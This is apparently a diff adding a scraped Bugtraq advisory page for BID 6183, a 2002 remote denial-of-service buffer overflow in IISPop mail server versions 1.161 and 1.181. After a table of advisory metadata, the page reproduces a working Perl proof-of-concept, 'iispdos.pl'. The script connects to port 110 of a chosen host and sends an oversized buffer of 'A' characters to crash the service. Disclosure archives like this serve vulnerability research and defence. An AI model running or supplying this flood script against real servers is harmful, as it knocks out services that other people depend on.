@@ -1,0 +1,110 @@
+#SpeeDr00t@Black Falcon<br>#bid6183<p><b><span style="font-size: 18pt;">IISPop Remote Buffer Overflow Denial of Service Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/6183/info">info</a><br><a href="http://www.securityfocus.com/bid/6183/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/6183/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/6183/solution">solution</a><br><a href="http://www.securityfocus.com/bid/6183/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				6183
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 14 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 14 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery credited to securma massine &lt;securma@caramail.com&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Curtis Specialty Consulting IISPop 1.181 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft IIS  5.0<br/>
+</span>
+					
+				
+					Curtis Specialty Consulting IISPop 1.161 <br/>
+<span class="related">
+						
+							-
+						
+						Microsoft IIS  5.0<br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept exploit was provided by securma massine &lt;securma@caramail.com&gt;:<br/><br/>#!/usr/bin/perl -w<br/># tool : iispdos.pl<br/># shutdown all version of IISPop<br/># greetz crack.fr , marocit ,christal<br/>#<br/><br/>use IO::Socket;<br/><br/>$ARGC=@ARGV;<br/>if ($ARGC !=1) {<br/>        print "\n--&gt;";<br/> print "\tUsage: perl iispdos.pl &lt;host&gt; \n";<br/>        exit;<br/>}<br/><br/>$remo = $ARGV0;<br/>$buffer = "A" x 289999;<br/><br/>print "\n--&gt;";<br/>print "\tconnection with $remo\n";<br/>unless ($so = IO::Socket::INET-&gt;new (Proto =&gt; "TCP",<br/>                                         PeerAddr =&gt; $remo,<br/>                                         PeerPort<br/>=&gt; "110"))<br/>{<br/> print "--&gt;";<br/> print "\tConnection Failed...\n";<br/> exit;<br/>}<br/>print $so "$buffer\n";<br/>close $so;<br/><br/>print "--&gt;";<br/>print "\tnow test if the distant host is down\n";<br/>exit;
+	
+		<ul>
+</ul>
+</div>
